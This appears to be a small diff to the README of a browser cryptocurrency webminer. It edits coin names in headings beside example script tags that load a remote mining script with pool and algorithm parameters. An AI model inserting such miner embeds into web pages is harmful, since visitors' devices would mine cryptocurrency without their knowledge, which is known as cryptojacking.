@@ -11,7 +11,7 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN V8 Coins (Monero, Lethean, Graft) need ?algo=cn/2<br> 
+#### Examples: CN V8 Coins need ?algo=cn/2<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/2?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
@@ -43,7 +43,7 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/half?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN Fast Coins (Conceal, Electronero) need ?algo=cn/msr<br> 
+#### Examples: CN Fast Coins (Electronero) need ?algo=cn/msr<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/msr?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
